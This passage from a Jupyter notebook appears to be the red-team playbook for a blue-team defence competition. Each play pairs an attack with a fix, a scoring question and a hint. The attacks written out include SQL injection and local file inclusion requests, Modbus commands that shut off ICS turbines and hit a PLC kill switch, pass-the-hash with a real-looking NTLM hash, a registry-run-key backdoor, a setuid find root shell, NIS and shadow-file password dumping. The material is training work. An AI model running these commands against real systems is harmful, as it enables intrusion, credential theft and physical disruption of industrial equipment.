    "url = \"http://\" + win2k12 + \"/info.php?cmd=dir\"\n",
    "print(\"URL: \" + url)\n",
    "x = requests.get(url)\n",
    "if (x.status_code == 200):\n",
    "    print(\"SQL Injection on \" + ubuntu + \" was successful and allowed lateral movement to \" + win2k12 + \".\")\n",
    "    print(x.text)\n",
    "else:\n",
    "    print(\"SQL Injection was not successful\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "  - NOTE: Different IP and port, the new code is on a different host\n",
    "\n",
    "### solution\n",
    "Vulnerability in the code at `/usr/local/apache2/htdocs/info.php`.\n",
    "Specifically, the `$sql = 'SELECT name, place, number FROM windfarm.location where number='. $q;`\n",
    "allows the exploit to work.\n",
    "The web page connects to an SQL database on the Win2012 host, which allows\n",
    "files to be written to the system.  Particularly, it can write to\n",
    "`C:\\php-test\\` which is used by a web server listening on port 8000.\n",
    "\n",
    "Multiple ways for sure, but using PHP's `settype` (before value assignment\n",
    "to the variable) as such works `settype($q, 'integer')`\n",
    "They must maintain expected functionality of being able to pass an arbitrary\n",
    "timezone.\n",
    "\n",
    "Note: Another option is to disable file writes in mysql.  If the user has privileged access they can enable it.  Then in the mysql options in the my.ini file, the path can be set.\n",
    "\n",
    "### score chat\n",
    "> What does your web server connect to for a database?\n",
    "> Could I exploit a vulnerability that would add files to the database server?\n",
    "> I used a vulnerability to add a file to the database server.  Which vulnerability did I exploit? Which file did I add to gain remote code execution on the database server?\n",
    "\n",
    "### hint\n",
    "> web, sql, lateral, web...RCE\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.608\n",
    "<a id='ref608'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "turn off an ICS turbine\n",
    "\n",
    "### exploit\n",
    "`python cfc_modbus.py 10.X.Y.8 power -t 1 2 -s off`\n",
    "This will turn turbine 1 and 2 to the off state"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "python cfc_modbus.py 10.5.2.8 power -t 1 2 -s off\n"
     ]
    }
   ],
   "source": [
    "print(\"python cfc_modbus.py \" + plc + \" power -t 1 2 -s off\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### solution:\n",
    "turn the devices back on \n",
    "### score chat\n",
    "> The hackers seem to be able to turn off your PLCs. Idenify how they are doing this.\n",
    "> What possible actions could be taken to prevent this?\n",
    "### hint\n",
    "do scada protocols have authentication\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.700\n",
    "<a id='ref700'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "data exfil with wget and directory traversal [inject], ubuntu 18.04, medium\n",
    "\n",
    "### exploit\n",
    "After the white team inject for this, the web page `http://10.X.Y.5/index.php`\n",
    "should allow `http://10.X.Y.5/index.php?f=help.php`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://\" + ubuntu + \"/index.php?f=help.php\"\n",
    "print(\"URL: \" + url)\n",
    "x = requests.get(url)\n",
    "if (x.status_code == 200):\n",
    "    print(\"Local File Inclusion was successful.\")\n",
    "    print(x.text)\n",
    "else:\n",
    "    print(\"Local File Inclusion was not successful\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "However, the updated code also allows exploitation as such,\n",
    "`wget http://10.X.Y.5/index.php?f=../../../../backup/blueprint.txt -O blueprint.txt`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://\" + ubuntu + \"/index.php?f=../../../../backup/blueprint.txt\"\n",
    "print(\"URL: \" + url)\n",
    "x = requests.get(url)\n",
    "if (x.status_code == 200):\n",
    "    print(\"Local File Inclusion with directory traversal was successful.\")\n",
    "    print(x.text)\n",
    "else:\n",
    "    print(\"Local File Inclusion was not successful\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### solution\n",
    "Directory traversal via the web server `index.php` file.  Specifically, the\n",
    "`include(\"$f\")` directive.\n",
    "\n",
    "### score chat\n",
    "> Find out how the hacker exfil the blueprint file\n",
    "\n",
    "### hint\n",
    "> web logs again?\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.701\n",
    "<a id='ref701'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "insecure SNMP query [baked], ubuntu 18.04, easy\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "snmp-check -v1 -c readwrite 10.X.Y.5 | awk '/... Processes:/{flag=1;next} /... Storage information:/{flag=0}flag'\n",
    "```\n",
    "or to get one at a time\n",
    "```bash\n",
    "snmpget -v1 -c readwrite 10.X.Y.5 .1.3.6.1.2.1.25.4.2.1.2.1\n",
    "# (increment the last number to get others)\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "snmpget -v1 -c readwrite 127.0.0.1 .1.3.6.1.2.1.25.4.2.1.2.1\n"
     ]
    }
   ],
   "source": [
    "print(\"snmpget -v1 -c readwrite \" + ubuntu + \" .1.3.6.1.2.1.25.4.2.1.2.1\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### solution\n",
    "snmp\n",
    "\n",
    "### score chat\n",
    "*NOTE*: Pick all or 10+ from the list obtained above to show the blueteam in place of [TBP]\n",
    "\n",
    "> The hackers remotely found the following running processses [TBP] on ubuntu, how did they get this information?\n",
    "\n",
    "### hint\n",
    "> Some services even log connections\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.702\n",
    "<a id='ref702'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "SMB pass-the-hash [baked]\n",
    "\n",
    "### notes\n",
    "*NOTE*: The whole score/solution/hint is somewhat weak, however there isn't a\n",
    "proper domain and we didn't log in from a client within the domain...so it is\n",
    "sort of hard for them to do proper dectection and analysis.\n",
    "\n",
    "### exploit\n",
    "`crackmapexec smb -u jbellfieldcw -H aad3b435b51404eeaad3b435b51404ee:40c67e4cb9a788f9384883826bcaa7bc -x 'whoami' 10.5.0.6 10.5.0.7 10.5.0.9`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"crackmapexec smb -u jbellfieldcw -H aad3b435b51404eeaad3b435b51404ee:40c67e4cb9a788f9384883826bcaa7bc -x 'whoami' 10.5.0.6 10.5.0.7 10.5.0.9\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "or\n",
    "\n",
    "`docker run --rm -it byt3bl33d3r/crackmapexec smb -u jbellfieldcw -H aad3b435b51404eeaad3b435b51404ee:40c67e4cb9a788f9384883826bcaa7bc -x 'whoami' 10.5.0.6 10.5.0.7 10.5.0.9`\n",
    "\n",
    "Note: To run the above you need to download to docker the image that is referenced.\n",
    "\n",
    "### solution\n",
    "See the hint material, but in general detection requires event monitoring on a\n",
    "client (only place it differentiates between password or hash) and mitigations\n",
    "involve not having local admins, domain admins are not also local admins, etc.\n",
    "\n",
    "### score chat\n",
    "> Hackers just used a pass-the-hash attack on the system, how could you detect and what are some mitigations?\n",
    "\n",
    "### hint\n",
    "> https://stealthbits.com/blog/how-to-detect-pass-the-hash-attacks/\n",
    "> https://attack.mitre.org/techniques/T1550/002/\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.703\n",
    "<a id='ref703'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "backup mysql database [baked], win2012, easy\n",
    "\n",
    "### exploit\n",
    "n/a\n",
    "\n",
    "### solution\n",
    "`msyqldump`\n",
    "\n",
    "### score chat\n",
    "> It's a good idea to back up your database. Back up mysql to `c:\\backup`\n",
    "\n",
    "### hint\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.704\n",
    "<a id='ref704'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "Windows local privilege escalation MS16_075 [baked], win2016, medium\n",
    "### exploit\n",
    "```bash\n",
    "use windows/local/ms16_075_reflection_juicy\n",
    "```\n",
    "### solution\n",
    "[TBD]\n",
    "### score chat\n",
    "> A user was able to get SYSTEM acess on win2016, how did they do it?\n",
    "### hint\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.705\n",
    "<a id='ref705'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "backdoor in writeable /etc/cron.hourly/man-db [baked], ubuntu 18.04, medium\n",
    "\n",
    "### exploit\n",
    "### solution\n",
    "### score chat\n",
    "### hint\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.706\n",
    "<a id='ref706'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "backdoor in windows server, registry run key [n/a - how to get access?], 2012\n",
    "\n",
    "### exploit\n",
    "With a shell stage a registry entry for the blueteam.  Then refer them to a tool that could detect reg run keys.\n",
    "\n",
    "With powershell execute the following command:\n",
    "Set-Itemproperty -path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Backdoor' -value 'C:\\users\\adminstrator\\desktop\\backdoor.exe'\n",
    "\n",
    "If you would like to generate a simple backdoor.exe file that repeats everything on a port that it receives,\n",
    "you can use the csharp_regrun.txt.  You need to change the IP Address that it associates with, a little C# could fix this.\n",
    "\n",
    "### solution\n",
    "Use a tool to detect the entry called backdoor.exe, delete the backdoor.exe file\n",
    "\n",
    "### score chat\n",
    "Using a tool I was able to detect a backdoor and delete the reg key and the backdoor created.\n",
    "\n",
    "### hint\n",
    "Use autoruns\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.707\n",
    "<a id='ref707'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "NIS enabled by default [baked], ubuntu 18.04, easy\n",
    "\n",
    "### exploit\n",
    "\n",
    "NIS was used in the past to share information across many servers, but was insecure by design.  \n",
    "If you knew the \"domain\" and had access to the port you could retrieve user lists with hashed passwords\n",
    "\n",
    "Remote:\n",
    "```\n",
    "ypcat -d fuga2gyfaiqehk4lbkxzgkcz5f.ex.internal.cloudapp.net -h 10.x.x.5 passwd\n",
    "```\n",
    "\n",
    "Local (as unprivileged user): \n",
    "```\n",
    "ypcat passwd\n",
    "```\n",
    "### solution\n",
    "Disable NIS, change the IP access list, and/or change the NIS domain\n",
    "### score chat\n",
    "> Hackers were able to retrieve a list of users and passwords remotely from the Ubuntu box\n",
    "### hint\n",
    "> Check the yellow pages\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.708\n",
    "<a id='ref708'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "initiate the kill switch on the PLC\n",
    "\n",
    "### exploit\n",
    "`python cfc_modbus.py 10.X.Y.8 killswitch`\n",
    "This will hit the emergency kill switch\n",
    "\n",
    "if unsuccessful from your kali box scp the file to .5 host and attempt to run it from there.\n",
    "\n",
    "### solution:\n",
    "Add Firewall rules to prevent access to the modbus port\n",
    "### score chat\n",
    "> The hackers were able to trigger an emergency lockdown and cut off all power, prevent them from being able to do this in the future\n",
    "### hint\n",
    "should modbus be on the internet? \n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.800\n",
    "<a id='ref800'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "psexec with known creds [baked], hard\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "psexec 10.X.Y.X -u $username -p $password C:\\Windows\\System32\\calc.exe ( Known Creds)\n",
    "psexec 10.0.x.x -s C:\\Windows\\System32\\calc.exe (System privilege)\n",
    "```\n",
    "\n",
    "### solution\n",
    "1. (Most Common event)\n",
    "Found Event ID `7045` in System Logs with details as below.\n",
    "```\n",
    "Service Name:  PSEXESVC\n",
    "Service File Name:  %SystemRoot%\\PSEXESVC.exe\n",
    "```\n",
    "\n",
    "2. Found `Computer\\HKEY_USERS\\$userSID\\Software\\Sysinternals\\PsExec` with `EulaAccepted` set to `1`\n",
    "\n",
    "### score chat\n",
    "> a process was started using known creds, trace how it was started for x points\n",
    "\n",
    "### hint\n",
    "> logs.. logs.. logs..\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.801\n",
    "<a id='ref801'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "SNMP extended MIB writes [baked], ubuntu 18.04, medium\n",
    "\n",
    "### exploit\n",
    "1. Should only display data when vulnerable:\n",
    "```bash\n",
    "snmpwalk -v1 -c readwrite 10.X.Y.5 .1.3.6.1.4.1.8072\n",
    "```\n",
    "2. Should still display data when \"fixed\" correctly: \n",
    "```bash\n",
    "snmpwalk -v1 -c readwrite 10.X.Y.5\n",
    "```\n",
    "\n",
    "### solution\n",
    "```\n",
    "view   noextended  included   .1\n",
    "view   noextended  excluded   .1.3.6.1.4.1.8072\n",
    "rwcommunity readwrite 192.168.0.0/16 -V noextended\n",
    "```\n",
    "\n",
    "### score chat\n",
    "> Hackers are abusing SNMP, configure it to disable NET-SNMP-EXTEND-MIB but allow otherwise\n",
    "\n",
    "### hint\n",
    "> VACM should specify what to include and exclude\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.802\n",
    "<a id='ref802'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "Enable DNS logging [n/a], win2016, medium\n",
    "\n",
    "### exploit:\n",
    "N/A\n",
    "[maybe do strange dns queries]\n",
    "\n",
    "### solution\n",
    "`named.conf`:\n",
    "```\n",
    "logging {\n",
    "        channel querylog {\n",
    "                file \"/var/log/querylog\";\n",
    "                severity debug 3;\n",
    "        };\n",
    "};\n",
    "```\n",
    "you would then send various DNS queries to make sure that their logging is picking it up\n",
    "\n",
    "### score chat\n",
    "> Enable Logging for DNS queries for X points\n",
    "\n",
    "### hint\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.803\n",
    "<a id='ref803'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "submit binary to virustotal [n/a - which binaries to use?]\n",
    "\n",
    "### exploit\n",
    "[TBD]\n",
    "\n",
    "### solution\n",
    "ask for the screenshot of the virustotal results\n",
    "\n",
    "### score chat\n",
    "> is the file `[]` malware? submit it to virustotal to find out\n",
    "\n",
    "### hint\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.804\n",
    "<a id='ref804'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "setuid /usr/bin/find [baked], ubuntu 18.04, easy\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "/usr/bin/find . -exec /bin/bash -p \\; -quit\n",
    "```\n",
    "\n",
    "### solution\n",
    "```bash\n",
    "chmod u-s /usr/bin/find\n",
    "```\n",
    "\n",
    "### score chat\n",
    "> one of regular users is running amok as root, find out how they're doing it\n",
    "\n",
    "### hint\n",
    "> set who id?\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.805\n",
    "<a id='ref805'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "insecure NTP query option [n/a - requires previous play instructions], win2016, easy\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "ntpq -c rv 10.X.Y.6\n",
    "```\n",
    "\n",
    "### solution\n",
    "in ntp.conf, default restrict to noquery, grant query to `10.X.Y.5` with restrict `10.X.Y.5`\n",
    "\n",
    "```bash\n",
    "restrict default kod nomodify notrap nopeer noquery\n",
    "unrestrict 10.X.Y.5 noquery\n",
    "```\n",
    "verify `sntp 10.X.Y.6` works from non-`10.X.Y.5` host\n",
    "verify `ntpq -c rv 10.X.Y.6` from `10.X.Y.5` (may have to install `ntp` package from universe repo)\n",
    "\n",
    "### score chat\n",
    "> While the subnet should be able to time sync, NTP should only allow query from 10.X.Y.5.\n",
    "> Configure it to be so so that hackers cannnot also query it remotely.\n",
    "\n",
    "### hint\n",
    "Give link to:\n",
    "> https://blog.selectel.com/synchronizing-servers-ntp/\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.806\n",
    "<a id='ref806'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "restore mysql database [baked], win2012, easy\n",
    "\n",
    "### exploit\n",
    "n/a\n",
    "\n",
    "### solution\n",
    "`msyqldump`\n",
    "\n",
    "### score chat\n",
    "> hackers delete your database, restore from your backup\n",
    "\n",
    "### hint\n",
    "\n",
    "### note\n",
    "\n",
    "after this play:\n",
    "> for 5 fun bonus point, share what you think about the competition and if you've competed in the past\n",
    "> how do think it compares to previous iterations? \n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.807\n",
    "<a id='ref807'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "audit weak passwords [baked], ubuntu 18.04, easy\n",
    "\n",
    "### exploit\n",
    "n/a\n",
    "\n",
    "### solution\n",
    "There are a number of ways to find these technically, however the blueteam\n",
    "should explain something along one of these:\n",
    "1) Using single mode. e.g.,\n",
    "\n",
    "```bash\n",
    "unshadow /etc/passwd /etc/shadow > newshadow\n",
    "john -single -format:descrypt newshadow\n",
    "john -single -format:md5crypt newshadow\n",
    "john -single -format:sha256crypt newshadow\n",
    "john -single -format:sha512crypt newshadow\n",
    "```\n",
    "2) Using a wordlist. e.g.,\n",
    "```bash\n",
    "cat /etc/passwd | tr ':' ' ' | tr ',' ' ' | tr ' ' '\\n' | sort -u > newwords.txt\n",
    "john -wordlist:newwords.txt -format:descrypt newshadow\n",
    "john -wordlist:newwords.txt -format:md5crypt newshadow\n",
    "john -wordlist:newwords.txt -format:sha256crypt newshadow\n",
    "john -wordlist:newwords.txt -format:sha512crypt newshadow\n",
    "```\n",
    "3) Using incremental mode. e.g.,\n",
    "```bash\n",
    "john -incremental /etc/shadow\n",
    "```\n",
    "Outside of describing how they performed discover, they should provide proof\n",
    "of at least 20 accounts which have weak passwords for full credit.\n",
    "\n",
    "### score chat\n",
    "> use john the ripper to audit the system accounts. describe the process\n",
    "and report the findings.\n",
    "\n",
    "### hint\n",
    "> Unshadow passwd and shadow and run john in single mode against the various formats\n",
    "> You should be able to get at least 20...\n",
    "\n",
    "\n",
    "\n",
    "------------------------------------------------------------------------------------------"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ref.808\n",
    "<a id='ref808'></a>\n",
    "\n",
    "[index](#index)\n",
    "\n",
    "### title\n",
    "persistence shell removal\n",
    "\n",
    "### exploit\n",
    "```bash\n",
    "\n",
    "```\n",
    "### solution\n",
    "### score chat\n",
    "> You can now kill all port 8111 shells. Try to detect and remove all shells used by red team. \n",
    "> Report back for each one.  \n",
    "### hint\n",
    "This is suppose to be fun and help them learn so give as much hint as necessary\n",
    "### note\n",
    "don't overwhelm blue, go at a pace that's acceptable to them\n",
    "As long as blue is showing effort and seems to be trying their best, give them full points\n",
    "The point here is that they have to ID and remove as many persistence, just that they're putting in a good effort\n",
    "\n",
    "Afterwards:\n",
    "> for 5 bonus points, what do think about this shell removal challenge? "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
